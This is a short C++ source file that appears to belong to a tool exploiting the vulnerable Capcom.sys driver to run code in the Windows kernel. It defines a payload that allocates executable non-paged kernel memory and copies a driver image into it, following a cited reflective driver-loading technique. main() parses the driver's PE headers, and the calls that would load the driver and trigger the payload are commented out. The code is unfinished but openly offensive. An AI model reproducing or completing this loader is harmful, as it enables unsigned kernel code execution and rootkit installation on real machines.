// CapcomLib.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "DriverLoader.h"
#include "KernelHelp.h"
#include "PELoader.h"

DECLARE_UNICODE_STRING(strAllocPoolWithTag, L"ExAllocatePoolWithTag");

PVOID NTAPI LoaderPayload(MmGetSystemRoutineFunc _MmGetSystemRoutineAddress)
{
	__debugbreak();
	// Allocate executable unpaged memory for driver
	PVOID drvmap = K_GetRoutine(ExAllocatePoolWithTag)(NonPagedPoolExecute, DriverLoader::TargetDriverPE.size(), '\0kdD');
	if (!drvmap) goto failure;

	// Nice intrinsic trick from https://github.com/Professor-plum/Reflective-Driver-Loader/blob/master/Hadouken/Hadouken.c
	__movsq((PDWORD64) drvmap, (PDWORD64) DriverLoader::TargetDriverPE.c_str(), (SIZE_T) DriverLoader::TargetDriverPE.size() / sizeof(INT64));

	failure:
	return nullptr;
} 

int main()
{
	PELoader loader(L"Capcom.sys");
	loader.GetNTHeaders();

	/*DriverLoader loader;
	loader.LoadDriverFromFile(L".\\Capcom.sys");
	loader.LoadCapcomService();
	loader.ExecIoCtlWithTrampoline(LoaderPayload);
	*/
	getchar();
    return 0;
}

